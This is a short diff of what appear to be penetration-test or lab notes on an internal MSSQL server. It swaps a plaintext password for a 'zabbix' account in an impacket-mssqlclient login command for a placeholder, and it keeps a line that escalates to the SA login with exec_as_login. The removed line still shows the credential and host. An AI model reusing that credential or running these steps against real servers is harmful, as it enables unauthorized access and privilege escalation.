@@ -1,5 +1,5 @@
 # Access SQL server using password
-impacket-mssqlclient zabbix:'rDhHbBEfh35sMbkY'@zph-svrsql01.zsm.local
+impacket-mssqlclient zabbix:'PasswordHere'@zph-svrsql01.zsm.local
 
 # Privilege escalation to SA
 SQL (zabbix  guest@master)> exec_as_login SA
